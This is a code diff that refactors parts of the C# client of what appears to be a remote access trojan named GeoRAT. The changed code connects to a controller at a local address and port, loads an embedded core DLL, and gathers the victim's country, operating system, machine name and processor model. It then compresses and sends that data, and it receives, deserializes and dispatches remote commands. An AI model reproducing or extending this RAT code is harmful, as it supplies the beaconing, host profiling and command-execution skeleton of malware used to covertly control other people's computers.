@@ -19,7 +19,7 @@ namespace GeoRAT.Client
         {
             //Create new client network instance on ip / port
             //associate event handlers, begin listening 
-            ClientNetwork network = new ClientNetwork("127.0.0.1", 9150);
+            var network = new ClientNetwork("127.0.0.1", 9150);
             network.OnConnected += OnConnected;
             network.BeginConnect();
             //Load core .DLL
@@ -35,7 +35,7 @@ namespace GeoRAT.Client
         {
             var dll = "GeoRAT.Client.Libraries.GeoRAT.Core.dll";
             EmbeddedAssembly.Load(dll, "GeoRAT.Client.Libraries.GeoRAT.Core.dll");
-            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(CurrentDomain_AssemblyResolve);
+            AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
         }
         static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
         {
@@ -59,7 +59,7 @@ namespace GeoRAT.Client
 
             Serializer ser = new Serializer();
 
-            Info i = new Info(GetInfo.GetCountry(), GetInfo.GetOS(), GetInfo.Name(),
+            var i = new Info(GetInfo.GetCountry(), GetInfo.GetOs(), GetInfo.Name(),
                 GetInfo.GetProcessorModel()); //Geenerate Info object 
             var buf = ser.Serialize(i);
             var cmp = Compression.Compress(buf); //Compress data using GZIP 
@@ -98,14 +98,12 @@ namespace GeoRAT.Client
         #region Commands
         static void HandleCommand(byte[] buf, int size)
         {
-
-            Commands k = new Commands();
-            CommandHandler handler = new CommandHandler();
-            CommandSerializer sr = new CommandSerializer();
+            var handler = new CommandHandler();
+            var sr = new CommandSerializer();
             var compressedbuf = Compression.Decompress(buf);
-            k = sr.Deserialize(compressedbuf);
+            var command = sr.Deserialize(compressedbuf);
             Console.WriteLine("Got new data, length {0} bytes", size);
-            handler.Handle(k);
+            handler.Handle(command);
         }
 
         #endregion
